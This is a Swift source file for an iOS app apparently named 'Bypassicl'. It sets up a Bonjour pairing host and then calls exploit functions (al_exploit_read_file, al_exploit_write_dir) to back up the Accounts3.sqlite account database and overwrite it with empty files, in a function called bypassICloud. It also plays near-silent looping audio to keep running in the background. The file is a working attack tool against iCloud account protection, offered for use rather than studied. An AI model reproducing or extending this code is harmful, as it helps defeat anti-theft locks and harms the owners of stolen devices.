// ============================================================
// AirliftService.swift — Bypassicl
// Continuous Bonjour pair-on-device advertisement
//
// REQUIRED Info.plist keys:
//   <key>NSBonjourServices</key>
//   <array>
//       <string>_remotepairing-pairable-host._tcp</string>
//       <string>_remotepairing._tcp</string>
//   </array>
//   <key>NSLocalNetworkUsageDescription</key>
//   <string>Bypassicl needs local network access to broadcast a pairing host.</string>
//   <key>UIBackgroundModes</key>
//   <array>
//       <string>audio</string>
//   </array>
// ============================================================

import Foundation
import Combine
import UniformTypeIdentifiers
import Network
import AVFoundation
import UIKit

class AirliftService: NSObject, ObservableObject, NetServiceDelegate {
    static let shared = AirliftService()
    
    @Published var logs: String = "=== Bypassicl Log ===\n"
    @Published var isPairing = false
    @Published var currentPin: String? = nil
    @Published var pairingFilePath: String? = nil
    @Published var lastDeviceName: String? = nil
    
    private var localNetBrowser: NWBrowser?
    private var audioPlayer: AVAudioPlayer?
    private let accountsDir = "/var/mobile/Library/Accounts"
    private let targetFiles = ["Accounts3.sqlite", "Accounts3.sqlite-shm", "Accounts3.sqlite-wal"]
    
    // ============================================================
    // CONTINUOUS BONJOUR STATE
    // ============================================================
    private var bonjourPublisher: NetService?
    private var publishedServiceId: String = "Bypassicl"
    private var publishedPort: Int32 = 0
    private var watchdogTimer: Timer?
    private var bonjourRetryWork: DispatchWorkItem?
    private var backgroundTaskId: UIBackgroundTaskIdentifier = .invalid
    private var pairingHostActive = false
    private var userCancelled = false
    
    var backupDir: URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("AccountsBackup")
    }
    
    private var documentsDir: URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
    }
    
    var hasCompleteBackup: Bool {
        let fm = FileManager.default
        return targetFiles.allSatisfy { file in
            let url = backupDir.appendingPathComponent(file)
            return fm.fileExists(atPath: url.path)
        }
    }
    
    override init() {
        super.init()
        NotificationCenter.default.addObserver(
            self, selector: #selector(onAppForeground),
            name: UIApplication.willEnterForegroundNotification, object: nil)
        NotificationCenter.default.addObserver(
            self, selector: #selector(onAppBackground),
            name: UIApplication.didEnterBackgroundNotification, object: nil)
    }
    
    deinit {
        NotificationCenter.default.removeObserver(self)
    }
    
    private func log(_ message: String) {
        DispatchQueue.main.async {
            self.logs += message + "\n"
            print(message)
        }
    }
    
    // ============================================================
    // FFI CALLBACKS
    // ============================================================
    private static let logCallback: ALLogCallback = { ctx, msg in
        guard let msg = msg, let ctx = ctx else { return }
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
        service.log("[Airlift] \(String(cString: msg))")
    }
    
    private static let pinCallback: ALPairPinCb = { pin, ctx in
        guard let pin = pin, let ctx = ctx else { return }
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
        let pinStr = String(cString: pin)
        DispatchQueue.main.async {
            service.currentPin = pinStr
            service.log("🔐 PIN: \(pinStr) → Settings → Privacy & Security → Developer Mode")
        }
    }
    
    private static let readyCallback: ALPairReadyCb = { ctx, serviceId, port, _, _, _ in
        guard let ctx = ctx else { return }
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
        let sid = serviceId != nil ? String(cString: serviceId!) : "Bypassicl"
        service.log("📡 Host ready: \(sid) : \(port)")
        
        // FFI exposes port as UInt16; NetService wants Int32.
        let netPort = Int32(port)
        
        DispatchQueue.main.async {
            service.startContinuousBonjourAdvertisement(serviceId: sid, port: netPort)
        }
    }
    
    // ============================================================
    // CONTINUOUS BONJOUR ADVERTISER
    // ============================================================
    func startContinuousBonjourAdvertisement(serviceId: String, port: Int32) {
        stopBonjourPublisherOnly()
        
        publishedServiceId = serviceId
        publishedPort      = port
        
        guard port > 0 else {
            log("⚠️ Skipping Bonjour publish — invalid port \(port)")
            return
        }
        
        let svc = NetService(
            domain: "local.",
            type:   "_remotepairing-pairable-host._tcp.",
            name:   serviceId,
            port:   port
        )
        svc.includesPeerToPeer = true
        svc.delegate = self
        svc.schedule(in: .main, forMode: .common)
        svc.publish()
        
        bonjourPublisher = svc
        log("🔊 Bonjour publishing: \(serviceId) @ \(port)")
        startBonjourWatchdog()
    }
    
    private func stopBonjourPublisherOnly() {
        watchdogTimer?.invalidate()
        watchdogTimer = nil
        bonjourPublisher?.stop()
        bonjourPublisher = nil
    }
    
    func stopContinuousBonjourAdvertisement() {
        bonjourRetryWork?.cancel()
        bonjourRetryWork = nil
        stopBonjourPublisherOnly()
        log("🔇 Bonjour advertisement stopped")
    }
    
    /// Watchdog: every 5s, verify the publisher still exists; republish if lost.
    private func startBonjourWatchdog() {
        watchdogTimer?.invalidate()
        watchdogTimer = Timer.scheduledTimer(withTimeInterval: 5.0, repeats: true) { [weak self] _ in
            guard let self = self, self.pairingHostActive else { return }
            if self.bonjourPublisher == nil {
                self.log("🔄 Watchdog: Bonjour publisher lost — republishing")
                self.startContinuousBonjourAdvertisement(
                    serviceId: self.publishedServiceId,
                    port: self.publishedPort
                )
            }
        }
    }
    
    private func scheduleBonjourRetry() {
        bonjourRetryWork?.cancel()
        let work = DispatchWorkItem { [weak self] in
            guard let self = self, self.pairingHostActive else { return }
            self.startContinuousBonjourAdvertisement(
                serviceId: self.publishedServiceId,
                port: self.publishedPort
            )
        }
        bonjourRetryWork = work
        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0, execute: work)
    }
    
    // MARK: NetServiceDelegate
    func netServiceDidPublish(_ sender: NetService) {
        log("✅ Bonjour published: \(sender.name) @ \(sender.port)")
    }
    
    func netService(_ sender: NetService, didNotPublish errorDict: [String : NSNumber]) {
        let code = errorDict[NetService.errorCode]?.intValue ?? -1
        log("❌ Bonjour didNotPublish (code \(code)) — retry in 2s")
        if bonjourPublisher === sender { bonjourPublisher = nil }
        scheduleBonjourRetry()
    }
    
    func netServiceDidStop(_ sender: NetService) {
        log("⏹ Bonjour service stopped")
        if bonjourPublisher === sender { bonjourPublisher = nil }
    }
    
    // ============================================================
    // BACKGROUND KEEP-ALIVE
    // ============================================================
    private func beginBackgroundTask() {
        guard backgroundTaskId == .invalid else { return }
        backgroundTaskId = UIApplication.shared.beginBackgroundTask(withName: "AirliftPairing") { [weak self] in
            self?.log("⏰ Background time expired — audio keep-alive will hold")
            self?.endBackgroundTask()
        }
    }
    
    private func endBackgroundTask() {
        guard backgroundTaskId != .invalid else { return }
        UIApplication.shared.endBackgroundTask(backgroundTaskId)
        backgroundTaskId = .invalid
    }
    
    @objc private func onAppForeground() {
        guard pairingHostActive else { return }
        log("🔆 Foreground — verifying Bonjour")
        if bonjourPublisher == nil {
            startContinuousBonjourAdvertisement(
                serviceId: publishedServiceId,
                port: publishedPort
            )
        }
        beginBackgroundTask()
    }
    
    @objc private func onAppBackground() {
        guard pairingHostActive else { return }
        log("🌙 Background — audio + NetService hold the ad")
        beginBackgroundTask()
    }
    
    // ============================================================
    // IMPORT PAIRING FILE
    // ============================================================
    func importPairingFile(from url: URL) {
        let accessing = url.startAccessingSecurityScopedResource()
        defer { if accessing { url.stopAccessingSecurityScopedResource() } }
        do {
            try FileManager.default.createDirectory(at: documentsDir, withIntermediateDirectories: true)
            let dest = documentsDir.appendingPathComponent("pairingRecord.mobiledevicepairing")
            var fileData: Data? = try? Data(contentsOf: url)
            if fileData == nil {
                var coordError: NSError?
                NSFileCoordinator().coordinate(readingItemAt: url, options: .withoutChanges, error: &coordError) { newURL in
                    fileData = try? Data(contentsOf: newURL)
                }
            }
            guard let data = fileData, !data.isEmpty else {
                log("❌ Could not read data from file: \(url.lastPathComponent)")
                return
            }
            try data.write(to: dest, options: .atomic)
            DispatchQueue.main.async {
                self.pairingFilePath = dest.path
                self.log("✅ Pairing file imported (\(data.count) bytes)")
            }
        } catch {
            log("❌ Import failed: \(error.localizedDescription)")
        }
    }
    
    // ============================================================
    // PAIR ON DEVICE
    // ============================================================
    func startPairingOnDevice() {
        guard !isPairing else { return }
        
        isPairing         = true
        currentPin        = nil
        userCancelled     = false
        pairingHostActive = true
        log("[*] Starting Pair on Device...")
        log("👉 Grant Local Network, then open Settings → Privacy & Security → Developer Mode")
        
        try? FileManager.default.createDirectory(at: documentsDir, withIntermediateDirectories: true)
        let outPath = documentsDir.appendingPathComponent("pairingRecord.mobiledevicepairing").path
        let ctx = Unmanaged.passUnretained(self).toOpaque()
        
        DispatchQueue.main.async {
            self.startKeepAliveAudio()
            self.beginBackgroundTask()
            self.triggerLocalNetworkPrompt()
        }
        
        DispatchQueue.global(qos: .userInitiated).async {
            var result = ALPairResult()
            
            let code = al_pairing_run_host(
                "0.0.0.0",
                0,
                "Bypassicl",
                "iPhone",
                outPath,
                nil,
                AirliftService.readyCallback,
                AirliftService.pinCallback,
                ctx,
                &result
            )
            
            defer { al_pairing_result_free(&result) }
            
            DispatchQueue.main.async {
                self.pairingHostActive = false
                self.stopContinuousBonjourAdvertisement()
                self.endBackgroundTask()
                self.stopPairingServices()
                self.isPairing   = false
                self.currentPin  = nil
                
                if code == 0 && !self.userCancelled {
                    if let path = result.pairing_file_path {
                        self.pairingFilePath = String(cString: path)
                        self.log("✅ Pairing successful!")
                        self.log("📁 File: \(self.pairingFilePath!)")
                    }
                    if let name = result.device_name {
                        self.lastDeviceName = String(cString: name)
                        self.log("📱 Device: \(self.lastDeviceName!)")
                    }
                } else if !self.userCancelled {
                    let err = result.error != nil ? String(cString: result.error!) : "unknown error"
                    self.log("❌ Pairing failed: \(err)")
                }
            }
        }
    }
    
    /// NWBrowser that holds the Local Network permission and self-heals.
    private func triggerLocalNetworkPrompt() {
        localNetBrowser?.cancel()
        localNetBrowser = nil
        
        let browser = NWBrowser(
            for: .bonjour(type: "_remotepairing-pairable-host._tcp", domain: "local."),
            using: .tcp
        )
        browser.stateUpdateHandler = { [weak self] state in
            switch state {
            case .ready:
                self?.log("🌐 Local Network permission granted")
            case .failed(let err):
                self?.log("⚠️ NWBrowser failed: \(err.localizedDescription) — retrying")
                DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
                    guard let self = self, self.pairingHostActive else { return }
                    self.triggerLocalNetworkPrompt()
                }
            default:
                break
            }
        }
        localNetBrowser = browser
        browser.start(queue: .main)
    }
    
    private func stopPairingServices() {
        localNetBrowser?.cancel()
        localNetBrowser = nil
        stopKeepAliveAudio()
    }
    
    // ============================================================
    // AUDIO KEEP-ALIVE
    // ============================================================
    private func startKeepAliveAudio() {
        do {
            let session = AVAudioSession.sharedInstance()
            try session.setCategory(.playback, options: [.mixWithOthers])
            try session.setActive(true)
            
            let sampleRate: UInt32 = 8000
            let numSamples: UInt32 = 8000
            let dataSize = numSamples * 2
            var wav = Data()
            wav.append("RIFF".data(using: .ascii)!)
            wav.append(withUnsafeBytes(of: (36 + dataSize).littleEndian) { Data($0) })
            wav.append("WAVEfmt ".data(using: .ascii)!)
            wav.append(withUnsafeBytes(of: UInt32(16).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(1).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(1).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: sampleRate.littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: (sampleRate * 2).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(2).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(16).littleEndian) { Data($0) })
            wav.append("data".data(using: .ascii)!)
            wav.append(withUnsafeBytes(of: dataSize.littleEndian) { Data($0) })
            wav.append(Data(count: Int(dataSize)))
            
            let player = try AVAudioPlayer(data: wav)
            player.numberOfLoops = -1
            player.volume = 0.01
            player.play()
            audioPlayer = player
        } catch {
            log("⚠️ Keep-alive audio error: \(error.localizedDescription)")
        }
    }
    
    private func stopKeepAliveAudio() {
        audioPlayer?.stop()
        audioPlayer = nil
        try? AVAudioSession.sharedInstance().setActive(false)
    }
    
    func stopPairing() {
        userCancelled     = true
        pairingHostActive = false
        stopContinuousBonjourAdvertisement()
        stopPairingServices()
        endBackgroundTask()
        isPairing  = false
        currentPin = nil
        log("⏹ Pairing cancelled")
    }
    
    // ============================================================
    // CONNECT
    // ============================================================
    func connect() -> Bool {
        log("[*] Checking pairing...")
        if pairingFilePath == nil {
            for name in ["pairingRecord.mobiledevicepairing", "pairingRecord.plist", "pairing.plist"] {
                let url = documentsDir.appendingPathComponent(name)
                if FileManager.default.fileExists(atPath: url.path) {
                    pairingFilePath = url.path
                    break
                }
            }
        }
        guard let path = pairingFilePath, FileManager.default.fileExists(atPath: path) else {
            log("❌ No pairing file found.")
            return false
        }
        log("✅ Using pairing file: \(path)")
        return true
    }
    
    // ============================================================
    // GRAPPA
    // ============================================================
    private func generateGrappaToken() -> Data? {
        let maxLen = 1024
        var buffer = [UInt8](repeating: 0, count: maxLen)
        var outLen: size_t = 0
        var errBuffer = [CChar](repeating: 0, count: 256)
        let result = ALGetGrappaToken(1, 0, 1, &buffer, maxLen, &outLen, &errBuffer, 256)
        if result == 0 { return Data(bytes: buffer, count: Int(outLen)) }
        log("Grappa Error (\(result)): \(String(cString: errBuffer))")
        return nil
    }
    
    // ============================================================
    // FFI HELPERS
    // ============================================================
    private func ffi_read_file(_ iosPath: String) -> Data? {
        guard let pairing = pairingFilePath else { return nil }
        var outData: UnsafeMutablePointer<UInt8>? = nil
        var outLen: size_t = 0
        var outError: UnsafeMutablePointer<CChar>? = nil
        let ctx = Unmanaged.passUnretained(self).toOpaque()
        let result = al_exploit_read_file(
            pairing, iosPath, AirliftService.logCallback, ctx,
            &outData, &outLen, &outError
        )
        defer {
            if let e = outError { al_string_free(e) }
            if let d = outData { al_bytes_free(d, outLen) }
        }
        guard result == 0, let ptr = outData, outLen > 0 else {
            let err = outError != nil ? String(cString: outError!) : "unknown error"
            log("❌ Read \(iosPath) failed: \(err)")
            return nil
        }
        return Data(bytes: ptr, count: Int(outLen))
    }
    
    private func ffi_write_dir(sourceDir: String, targetDir: String) -> Bool {
        guard let pairing = pairingFilePath else { return false }
        var outError: UnsafeMutablePointer<CChar>? = nil
        let ctx = Unmanaged.passUnretained(self).toOpaque()
        let result = al_exploit_write_dir(
            pairing, sourceDir, targetDir,
            AirliftService.logCallback, ctx, &outError
        )
        defer { if let e = outError { al_string_free(e) } }
        guard result == 0 else {
            let err = outError != nil ? String(cString: outError!) : "unknown error"
            log("❌ Write failed: \(err)")
            return false
        }
        return true
    }
    
    // ============================================================
    // AUTO BACKUP
    // ============================================================
    private func autoBackupAccountsIfNeeded() -> Bool {
        if hasCompleteBackup {
            log("ℹ️ Original backup exists — keeping it.")
            return true
        }
        log("[*] Auto-backing up Accounts files...")
        do {
            try FileManager.default.createDirectory(at: backupDir, withIntermediateDirectories: true)
        } catch {
            log("❌ Backup dir: \(error.localizedDescription)")
            return false
        }
        for file in targetFiles {
            let path = "\(accountsDir)/\(file)"
            guard let data = ffi_read_file(path) else {
                log("❌ Auto-backup failed for \(file)")
                return false
            }
            do {
                try data.write(to: backupDir.appendingPathComponent(file), options: .atomic)
                log("✅ Backup: \(file) (\(data.count) bytes)")
            } catch {
                log("❌ Write backup \(file): \(error.localizedDescription)")
                return false
            }
        }
        log("✅ Auto-backup done: \(backupDir.path)")
        return true
    }
    
    // ============================================================
    // BYPASS
    // ============================================================
    func bypassICloud() {
        log("[*] Starting Bypass...")
        guard autoBackupAccountsIfNeeded() else {
            log("❌ Bypass cancelled — backup failed")
            return
        }
        let tmp = FileManager.default.temporaryDirectory.appendingPathComponent("empty_\(UUID().uuidString)")
        do {
            try FileManager.default.createDirectory(at: tmp, withIntermediateDirectories: true)
            for file in targetFiles {
                try Data().write(to: tmp.appendingPathComponent(file), options: .atomic)
            }
        } catch {
            log("❌ Overwrite prep: \(error.localizedDescription)")
            return
        }
        if ffi_write_dir(sourceDir: tmp.path, targetDir: accountsDir) {
            log("🎉 BYPASS SUCCESSFUL! Reboot.")
        } else {
            log("❌ Failed to write files")
        }
        try? FileManager.default.removeItem(at: tmp)
    }
    
    // ============================================================
    // RESTORE
    // ============================================================
    func restoreOriginalAccounts() {
        log("[*] Restoring original accounts...")
        let fm = FileManager.default
        let stagingDir = FileManager.default.temporaryDirectory.appendingPathComponent("restore_\(UUID().uuidString)")
        do {
            try fm.createDirectory(at: stagingDir, withIntermediateDirectories: true)
            for file in targetFiles {
                let backupFileURL = backupDir.appendingPathComponent(file)
                guard fm.fileExists(atPath: backupFileURL.path) else {
                    log("❌ Missing backup: \(file)")
                    return
                }
                try fm.copyItem(at: backupFileURL, to: stagingDir.appendingPathComponent(file))
            }
            if ffi_write_dir(sourceDir: stagingDir.path, targetDir: accountsDir) {
                log("✅ Restored originals! Reboot.")
            } else {
                log("❌ Restore write failed")
            }
        } catch {
            log("❌ Restore: \(error.localizedDescription)")
        }
        try? fm.removeItem(at: stagingDir)
    }
}